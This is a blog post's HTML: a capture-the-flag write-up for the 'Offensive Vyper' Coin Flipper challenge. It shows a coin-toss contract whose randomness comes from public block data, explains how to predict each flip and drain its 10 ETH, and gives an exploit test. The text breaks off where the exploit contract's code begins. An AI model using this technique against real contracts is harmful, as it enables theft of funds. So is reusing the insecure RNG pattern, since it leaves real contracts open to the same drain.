@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Offensive Vyper - Challenge 2 - Coin Flipper - della&#39;s blog</title><meta name="Description" content="della&#39;s blog"><meta property="og:title" content="Offensive Vyper - Challenge 2 - Coin Flipper" />
+<meta property="og:description" content="Solution for &ldquo;Offensive Vyper - Challenge 2 - Coin Flipper&rdquo;." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dellalibera.github.io/posts/offensivevyper_02_coinflipper/" /><meta property="og:image" content="https://dellalibera.github.io"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-09-26T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-09-26T00:00:00+00:00" /><meta property="og:site_name" content="della&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://dellalibera.github.io"/>
+
+<meta name="twitter:title" content="Offensive Vyper - Challenge 2 - Coin Flipper"/>
+<meta name="twitter:description" content="Solution for &ldquo;Offensive Vyper - Challenge 2 - Coin Flipper&rdquo;."/>
+<meta name="application-name" content="della&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="della&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dellalibera.github.io/posts/offensivevyper_02_coinflipper/" /><link rel="prev" href="https://dellalibera.github.io/posts/offensivevyper_01_unstoppableauction/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Offensive Vyper - Challenge 2 - Coin Flipper",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/dellalibera.github.io\/posts\/offensivevyper_02_coinflipper\/"
+        },"genre": "posts","keywords": "Offensive Vyper, CTF, Vyper, Blockchain","wordcount":  836 ,
+        "url": "https:\/\/dellalibera.github.io\/posts\/offensivevyper_02_coinflipper\/","datePublished": "2022-09-26T00:00:00+00:00","dateModified": "2022-09-26T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "della"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="della&#39;s blog">della&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> Home </a><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/advisories/"> Advisories </a><a class="menu-item" href="/about/"> About </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="della&#39;s blog">della&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="">Home</a><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/advisories/" title="">Advisories</a><a class="menu-item" href="/about/" title="">About</a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title">Offensive Vyper - Challenge 2 - Coin Flipper</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://dellalibera.github.io/about/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>della</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeup</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="September 26, 2022">September 26, 2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;836 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-challenge">1) Challenge</a></li>
+    <li><a href="#2-code-review">2) Code Review</a></li>
+    <li><a href="#3-solution">3) Solution</a></li>
+    <li><a href="#4-references">4) References</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div id="id-1">Solution for &ldquo;Offensive Vyper - Challenge 2 - Coin Flipper&rdquo;.</div>
+<h2 id="1-challenge">1) Challenge</h2>
+<div class="details admonition quote open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">The Coin Flipper is a true/false coin-toss with a 50% chance of either. It costs one Ether to play, but pays two Ether on a correct guess. On a long enough timescale, players are expected to break even. Your objective is to not break even; drain all ten Ether from the contract.</div>
+        </div>
+    </div>
+<p>Challenge created by <a href="https://twitter.com/jtriley_eth" target="_blank" rel="noopener noreffer ">@jtriley_eth</a>.</p>
+<h2 id="2-code-review">2) Code Review</h2>
+<p>This challenge has two contracts: <code>CoinFlipper</code>, used to handle the coin-toss logic, and <code>RandomNumber</code>, used to generate random numbers.</p>
+<p><code>CoinFlipper.vy</code> contract (<a href="https://github.com/JoshuaTrujillo15/offensive_vyper/blob/main/contracts/coin-flipper/CoinFlipper.vy" target="_blank" rel="noopener noreffer ">source code</a>):</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#888;font-style:italic"># @version ^0.3.2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#5a2">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">@title Coin Flipper
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">@author jtriley.eth
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">interface</span> <span style="color:#000">Rng</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">def</span> <span style="color:#000">generate_random_number</span>() -&gt; <span style="color:#000">uint256</span>: <span style="color:#000">nonpayable</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">event</span> <span style="color:#000">Winner</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#000">account</span>: <span style="color:#000">indexed</span>(<span style="color:#000">address</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#000">amount</span>: <span style="color:#000">uint256</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">generator</span>: <span style="color:#000">public</span>(<span style="color:#000">address</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">cost</span>: <span style="color:#000">constant</span>(<span style="color:#000">uint256</span>) = <span style="color:#3af">10</span> ** <span style="color:#3af">18</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">@external</span>
+</span></span><span style="display:flex;"><span><span style="color:#000">@payable</span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">__init__</span>(<span style="color:#000">generator</span>: <span style="color:#000">address</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#000">self</span>.<span style="color:#000">generator</span> = <span style="color:#000">generator</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">@external</span>
+</span></span><span style="display:flex;"><span><span style="color:#000">@payable</span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">flip_coin</span>(<span style="color:#000">guess</span>: <span style="color:#000">bool</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#5a2">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @notice Takes a guess and 1 ether. If correct, it pays 2 ether.
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @param guess Heads or Tails (true for heads).
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @dev Throws when value is not 1 ether.
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">assert</span> <span style="color:#000">msg</span>.<span style="color:#000">value</span> == <span style="color:#000">cost</span>, <span style="color:#5a2">&#34;cost is 1 ether&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">side</span>: <span style="color:#000">bool</span> = <span style="color:#000">Rng</span>(<span style="color:#000">self</span>.<span style="color:#000">generator</span>).<span style="color:#000">generate_random_number</span>() % <span style="color:#3af">2</span> == <span style="color:#3af">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">if</span> <span style="color:#000">side</span> == <span style="color:#000">guess</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">amount</span>: <span style="color:#000">uint256</span> = <span style="color:#000">cost</span> * <span style="color:#3af">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">send</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">amount</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">log</span> <span style="color:#000">Winner</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">amount</span>)</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<p>The main function of this contract is <code>flip_coin</code>:</p>
+<ul>
+<li>it accepts a boolean value (the guess)</li>
+<li>it checks if <code>1</code> ETH is sent (line <code>36</code>).</li>
+<li>it calls the <code>generate_random_number</code> from the <code>RandomNumber</code> contract and checks if module <code>2</code> of the result is equal to <code>0</code> (line <code>38</code>)</li>
+<li>the resulting boolean value is compared with the <code>guess</code> parameter (line <code>40</code>)</li>
+<li>if they are equal, the sender will receive <code>2</code> ETH (lines <code>42-44</code>)</li>
+</ul>
+<p><code>RandomNumber.vy</code> contract (<a href="https://github.com/JoshuaTrujillo15/offensive_vyper/blob/main/contracts/coin-flipper/RandomNumber.vy" target="_blank" rel="noopener noreffer ">source code</a>)</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#888;font-style:italic"># @version ^0.3.2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#5a2">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">@title Random Number Generator
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">@author jtriley.eth
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">nonce</span>: <span style="color:#000">public</span>(<span style="color:#000">uint256</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">@external</span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">generate_random_number</span>() -&gt; <span style="color:#000">uint256</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#5a2">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @notice Generates a random number for the caller.
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @dev Increment nonce to ensure two contracts don&#39;t receive the same value in the same block.
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">digest</span>: <span style="color:#000">bytes32</span> = <span style="color:#000">keccak256</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#000">concat</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#000">block</span>.<span style="color:#000">prevhash</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#000">convert</span>(<span style="color:#000">block</span>.<span style="color:#000">timestamp</span>, <span style="color:#000">bytes32</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#000">convert</span>(<span style="color:#000">block</span>.<span style="color:#000">difficulty</span>, <span style="color:#000">bytes32</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#000">convert</span>(<span style="color:#000">self</span>.<span style="color:#000">nonce</span>, <span style="color:#000">bytes32</span>)
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">self</span>.<span style="color:#000">nonce</span> += <span style="color:#3af">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">return</span> <span style="color:#000">convert</span>(<span style="color:#000">digest</span>, <span style="color:#000">uint256</span>)</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<p>It exposes only one function, <code>generate_random_number</code> that is responsible for computing a random number:</p>
+<ul>
+<li>it uses block information like the previous hash, timestamp and the difficulty</li>
+<li>it concatenates all these values with also a <code>nonce</code> variable</li>
+<li>finally, it computes the <code>keccak256</code> of this value and increments the nonce by <code>1</code></li>
+</ul>
+<p>Generating random numbers has always been challenging in the blockchain context. In this case, everyone can also know the source of randomness used (i.e. the block information) since this information is public.</p>
+<div class="details admonition question open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Question<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">How can we guess the right coin flip?</div>
+        </div>
+    </div>
+<p>Given that we can access the same information that the <code>generate_random_number</code> uses to compute the &ldquo;random&rdquo; number, to guess the right coin flip, we can replicate the code inside the function, calculate the boolean value and then call the <code>flip_coin</code>.</p>
+<p>We need to replicate the code inside <code>generate_random_number</code> and not simply call that function because, at every call, it updates the <code>nonce</code> variable. So if we first call <code>generate_random_number</code> to compute the value and then pass the resulting boolean value to <code>flip_coin</code>, <code>generate_random_number</code> will be called again, but the nonce will be different from the one we used, leading to a potentially different result. So, if we replicate the code, we can also replicate the nonce value and compute the right guess.</p>
+<h2 id="3-solution">3) Solution</h2>
+<p>The solution consists of different steps:</p>
+<ul>
+<li>call our contract function, sending <code>1</code> ETH</li>
+<li>compute the same random number using the same code of <code>generate_random_number</code></li>
+<li>call <code>flip_coin</code> we the value just computed</li>
+<li>increment the nonce</li>
+<li>Repeat these steps ten times until we drained all the founds (the balance of the <code>CoinFlip</code> contract is <code>10</code> ETH, so if each time we win, we&rsquo;ll decrease the balance by one)</li>
+</ul>
+<p><code>coin-flipper.challenge.js</code>:
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>    <span style="color:#000">it</span>(<span style="color:#5a2">&#39;Exploit&#39;</span>, <span style="color:#00f">async</span> <span style="color:#00f">function</span> () {
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// YOUR EXPLOIT HERE
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">let</span> <span style="color:#000">exploit</span> = <span style="color:#00f">await</span> (<span style="color:#00f">await</span> <span style="color:#000">ethers</span>.<span style="color:#000">getContractFactory</span>(<span style="color:#5a2">&#39;CoinFlipperExploit&#39;</span>, <span style="color:#000">deployer</span>)).<span style="color:#000">deploy</span>(<span style="color:#00f">this</span>.<span style="color:#000">coinFlipper</span>.<span style="color:#000">address</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#000">exploit</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">run</span>({
+</span></span><span style="display:flex;"><span>            <span style="color:#000">value</span>: <span style="color:#000">ethers</span>.<span style="color:#000">utils</span>.<span style="color:#000">parseEther</span>(<span style="color:#5a2">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    })</span></span></code></pre></td></tr></table>
+</div>
+</div></p>
+<p><code>CoinFlipperExploit.vy</code>:
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
